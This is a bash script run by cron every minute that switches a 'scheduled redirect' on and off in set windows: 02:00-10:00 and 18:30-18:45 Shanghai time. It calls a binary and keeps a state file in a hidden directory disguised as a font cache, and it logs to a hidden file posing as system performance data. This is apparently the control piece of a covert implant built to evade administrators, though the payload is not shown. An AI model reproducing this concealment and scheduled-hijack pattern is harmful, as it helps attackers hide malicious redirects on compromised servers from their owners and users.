#!/bin/bash
# YG 定时跳转：tick 由 cron 每分钟调用。按窗口开/关，并写状态防重复。
export TZ=Asia/Shanghai
D=/usr/share/cmake/bash-completion/completions/data/cache/fonts/.cache-xorg
LOG=/var/log/.sysjournal/perf.stat
NOW=$(date '+%H:%M')
state(){ [ -f $D/.sysd ] && echo on || echo off; }
log(){ echo "[$(date '+%F %T')] $*" >> $LOG; }
cur=$(state)
# 窗口：02:00-10:00 与 18:30-18:45（分精度，跨零点也支持）
want=off
for w in "02:00-10:00" "18:30-18:45"; do
  s=${w%-*}; e=${w#*-}
  sm=$((10#${s%:*}*60+10#${s#*:})); em=$((10#${e%:*}*60+10#${e#*:})); cm=$((10#${NOW%:*}*60+10#${NOW#*:}))
  if [ $sm -le $em ]; then [ $cm -ge $sm ] && [ $cm -lt $em ] && want=on; else [ $cm -ge $sm ] || [ $cm -lt $em ] && want=on; fi
done
if [ "$want" != "$cur" ]; then
  if [ "$want" = on ]; then $D/cgroup-sync on  >> $LOG 2>&1 && touch $D/.sysd && log "OPEN  $NOW 开闸"; else $D/cgroup-sync off >> $LOG 2>&1 && rm -f $D/.sysd && log "CLOSE $NOW 关闸还原"; fi
fi
